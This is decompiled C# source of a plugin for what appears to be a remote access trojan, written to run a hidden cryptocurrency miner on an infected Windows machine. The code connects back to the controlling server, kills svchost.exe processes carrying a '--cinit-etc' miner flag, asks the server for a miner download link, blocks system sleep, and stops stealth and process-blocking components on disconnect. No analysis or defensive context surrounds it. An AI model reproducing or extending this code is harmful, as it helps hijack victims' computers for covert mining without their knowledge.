using System;
using System.Diagnostics;
using System.Management;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Leb128;
using Plugin.Helper;

namespace Plugin;

public class Plugin
{
	public static Socket tcpClient;

	public static X509Certificate2 X509Certificate2;

	public static string hwid;

	public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
	{
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		tcpClient = TcpClient;
		hwid = Hwid;
		X509Certificate2 = x509Certificate2;
		Client.Connect(tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[1]);
		if (Client.itsConnect)
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher(string.Format("Select CommandLine, ProcessID from Win32_Process where Name='{0}'", "svchost.exe")).Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.Current;
					try
					{
						if (((string)((ManagementBaseObject)val)["CommandLine"]).Contains("--cinit-etc"))
						{
							Process.GetProcessById(Convert.ToInt32(((ManagementBaseObject)val)["ProcessId"])).Kill();
						}
					}
					catch
					{
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			Client.Send(LEB128.Write(new object[2] { "MinerEtc", "GetLink" }));
			Methods.PreventSleep();
		}
		while (Client.itsConnect)
		{
			Thread.Sleep(100);
		}
		AntiProcess.StopBlock();
		Stealth.Stop();
		MinerControler.Stop();
		Client.Disconnect();
		Thread.Sleep(5000);
	}
}
